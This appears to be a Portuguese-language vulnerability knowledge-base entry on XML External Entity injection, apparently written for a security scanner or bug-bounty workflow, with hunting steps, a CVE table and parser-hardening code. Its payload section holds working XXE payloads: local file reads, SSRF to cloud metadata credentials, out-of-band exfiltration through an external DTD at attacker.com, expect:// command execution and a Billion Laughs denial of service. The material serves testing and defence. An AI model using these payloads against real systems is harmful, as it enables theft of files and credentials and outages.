---
id: xxe
title: "XML External Entity Injection"
module: "xxe"
severity: "HIGH"
cwe_id: "CWE-611"
cwe_title: "Improper Restriction of XML External Entity Reference"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "injection.xml_external_entity_injection"
---

## Summary
Parsers XML que resolvem entidades externas permitem leitura de arquivos locais, SSRF, exfiltração out-of-band e, em alguns casos, RCE. Qualquer endpoint que aceite XML, SVG, DOCX/XLSX ou SOAP pode ser afetado.

## Description
XML permite declarar entidades personalizadas no `DOCTYPE`. Quando o parser tem `external entities` habilitadas, uma entidade pode referenciar `file://`, `http://` ou outros esquemas, e o conteúdo é resolvido durante o parse. Isso permite:

- **XXE clássico:** conteúdo do arquivo é refletido na resposta.
- **XXE cego:** sem reflexão, confirmado via OOB (DNS/HTTP) ou erro.
- **XXE OOB:** entidades parametrizadas e DTD externo exfiltram dados para um servidor controlado.
- **SSRF via XXE:** requisições internas para metadata/cloud e serviços internos.
- **Billion laughs / DoS:** expansão de entidades causa consumo de memória/CPU.
- **RCE:** via `expect://` (PHP), desserialização em Java ou cadeias específicas de parser.

Formatos alternativos que carregam XML: SVG, DOCX, XLSX, PPTX, SOAP, RSS, SAML, XHTML, configurações e uploads "XML".

## Impact
- Leitura de arquivos sensíveis (`/etc/passwd`, chaves, configurações, `.env`).
- Roubo de credenciais cloud via metadata (SSRF).
- Exfiltração de dados internos e movimento lateral.
- DoS por expansão de entidades.
- Em casos específicos, execução remota de código.
- Impacto HIGH; pode ser CRITICAL com RCE ou credenciais cloud.

## Payloads and Bypasses
```xml
<!-- XXE clássico: leitura de arquivo -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

```xml
<!-- XXE via PHP filter -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>
```

```xml
<!-- SSRF via XXE para metadata -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

```xml
<!-- XXE cego com DTD externo -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

`evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
%all;
```

```xml
<!-- XXE OOB com parâmetro -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=test">
  %xxe;
]>
```

Variações e bypasses:
```text
- SVG: <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
- DOCX/XLSX: inserir evil.xml em word/document.xml ou [Content_Types].xml
- SOAP: colocar DOCTYPE antes de <soap:Envelope>
- UTF-16/UTF-7 encoding para bypass de filtros
- Entidades parametrizadas quando entidades gerais são bloqueadas
- `SYSTEM "file:///etc/hostname"` para confirmar leitura
- `expect://id` em PHP com expect habilitado
- `jar:file:///...!/` e `gopher://` para SSRF
- Negação de serviço: Billion Laughs
```

Billion Laughs:
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

Casos reais e mentalidade de ataque (RWBH): Yahoo (parsers XML em mail/upload) e Facebook (DOCX/XLSX) mostram que o vetor não é só SOAP; o atacante testa SVG, DOCX, SAML e OOB quando a resposta não reflete o arquivo.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2018-17247 | Elasticsearch | 2018 | XXE no find_file_structure API do ML -- leitura de arquivo e SSRF se policy de rede permitir | File disclosure |
| CVE-2018-20843 | libexpat | 2019 | Billion Laughs via nomes XML com muitos colons -- DoS exponencial no parser | DoS (entity expansion) |
| CVE-2019-12415 | Apache POI | 2019 | XXE ao converter documentos Excel via XSSFExportToXml -- leitura de arquivo local | File disclosure |
| CVE-2018-11788 | Apache Karaf | 2019 | XXE via features deployer no hot deploy -- permite resolver entidades externas | File disclosure |
| CVE-2020-26258 | XStream | 2020 | SSRF via XXE em deserializacao XML -- atacante controla URL de entidade externa | SSRF via XXE |
| CVE-2020-26259 | XStream | 2020 | Delecao arbitraria de arquivo via deserializacao XML maliciosa | File manipulation |
| CVE-2021-23926 | Apache XMLBeans | 2021 | Parser XML sem properties de seguranca -- Billion Laughs e XXE out-of-band | OOB + DoS |
| CVE-2021-29505 | XStream | 2021 | RCE via desserializacao de objeto embarcado em XML | RCE via XML |

## Escalation Techniques
XXE e um vetor versatil que pode escalar para varios impactos:

- **Leitura de arquivos sensiveis:** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` permite ler arquivos do servidor. Escalar para `/etc/shadow`, chaves SSH, configuracoes de banco, credenciais em `.env`.
- **SSRF via XXE:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` permite acessar metadata de cloud, servicos internos e portas fechadas ao exterior.
- **Port scanning interno:** variar a porta no SYSTEM URL e observar tempos de resposta ou erros para mapear servicos internos.
- **RCE via expect://:** em PHP com `expect` habilitado, `<!ENTITY xxe SYSTEM "expect://id">` executa comandos no servidor. Raro mas devastador.
- **Billion Laughs (DoS):** entidades recursivas consomem memoria exponencialmente, derrubando o parser e potencialmente o servidor inteiro.
- **Exfiltracao OOB (Out-of-Band):** quando a resposta nao reflete o conteudo, usar parameter entities para enviar dados via DNS ou HTTP para servidor controlado.
- **XXE em documentos compostos:** DOCX, XLSX, SVG, PDF sao ZIP com XML interno. Upload de documento malicioso pode triggerar XXE no parser server-side.

## Hunting Methodology
Processo para identificar XXE:

1. **Identificar endpoints que processam XML:** buscar `Content-Type: application/xml`, `text/xml`, `application/soap+xml`. Verificar se a aplicacao aceita XML mesmo quando o Content-Type default e JSON.
2. **Testar upload de arquivos:** SVG, DOCX, XLSX, PPTX, RSS/Atom feeds -- todos contem XML internamente.
3. **Injetar DTD basica:** enviar `<!DOCTYPE test [<!ENTITY xxe "CANARY">]><root>&xxe;</root>` e verificar se "CANARY" aparece na resposta.
4. **Escalar para file read:** trocar `"CANARY"` por `SYSTEM "file:///etc/hostname"`. Se o conteudo do arquivo aparece na resposta, e XXE confirmado.
5. **Testar OOB:** se a resposta nao reflete o conteudo, usar servidor de callback (Collaborator, interact.sh) com `<!ENTITY xxe SYSTEM "http://callback.attacker.com/xxe">`.
6. **Testar SAML/SOAP:** endpoints de autenticacao SAML e web services SOAP processam XML por definicao -- testar com DTD injetada.
7. **Verificar error-based:** enviar SYSTEM URL invalida e observar se o erro vaza informacao do path ou do parser.

## False Positive Indicators
Sinais de que o finding **nao e XXE exploravel**:

- **Parser rejeita DOCTYPE:** resposta contem erro "DOCTYPE is disallowed" -- parser configurado com `disallow-doctype-decl`.
- **Entidade nao resolvida:** `&xxe;` aparece literalmente na resposta em vez do conteudo do arquivo.
- **XML processado client-side:** JavaScript no browser faz o parsing, nao o servidor.
- **Content-Type nao e XML:** endpoint aceita o body mas o processa como texto plano ou JSON.
- **Upload aceita mas nao processa XML interno:** servidor armazena o arquivo sem extrair ou renderizar o XML.
- **OOB callback recebido mas sem dados:** DNS resolve mas nenhum dado e exfiltrado -- pode indicar firewall de egress.
- **Erro de parsing generico sem vazamento:** "Malformed XML" sem path ou conteudo de arquivo no erro.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `xml`, `data`, `document`, `file`, `upload`, `content`, `body`, `payload`, `svg`, `feed`, `soap`, `saml`, `config`.
- **Paths comuns:** `/api/import`, `/upload`, `/xml`, `/soap`, `/saml`, `/parse`, `/convert`, `/preview`, `/avatar`, `/invoice`, `/export`.
- **Sinais:** `Content-Type: application/xml`, `text/xml`, `application/soap+xml`; upload de SVG/DOCX/XLSX; resposta contém conteúdo de arquivo; erros de parser com path local.

## Recommendation
1. Desabilitar DTDs e entidades externas no parser. Em Java:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```
2. Para StAX/SAX, desabilitar `external-general-entities`, `external-parameter-entities` e `load-external-dtd`; usar `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false`.
3. Para Python, usar `defusedxml`; para .NET, `XmlReaderSettings.DtdProcessing = Prohibit` e `XmlResolver = null`.
4. Preferir JSON quando possível; se XML for necessário, validar contra XSD e rejeitar `DOCTYPE`.
5. Limitar tamanho de payload, profundidade e expansão de entidades; configurar timeout e memória.
6. Em uploads, validar tipo real, desabilitar processamento de XML em SVG/DOCX e usar sandbox para conversão.
7. Segregar o parser de XML em serviço isolado, sem acesso a filesystem/network, quando inevitável.
8. Monitorar requisições com `DOCTYPE`, `SYSTEM`, `PUBLIC`, `file://` e chamadas OOB.
